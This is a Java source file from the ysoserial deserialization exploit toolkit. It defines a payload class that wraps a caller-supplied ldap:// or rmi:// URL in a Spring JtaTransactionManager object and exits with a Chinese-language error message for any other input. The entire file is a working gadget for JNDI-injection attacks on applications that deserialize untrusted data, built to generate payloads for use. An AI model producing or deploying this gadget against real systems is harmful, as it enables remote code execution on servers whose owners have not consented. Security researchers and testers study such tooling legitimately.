package ysoserial.payloads;


import org.springframework.transaction.jta.JtaTransactionManager;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;


@Dependencies({"org.springframework:spring-core:*"})
public class jtaTransactionManager implements ObjectPayload<Object> {

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(jtaTransactionManager.class, args);
    }


    public Object getObject(final String command) throws Exception {
        if (command != null && !command.startsWith("ldap") && !command.startsWith("rmi")) {
            System.err.println("!!! 输入错误, 请输入ldap://或rmi://格式的url");
            System.exit(1);
        }
        JtaTransactionManager o = new JtaTransactionManager();
        o.setUserTransactionName(command);
        return o;
    }
}
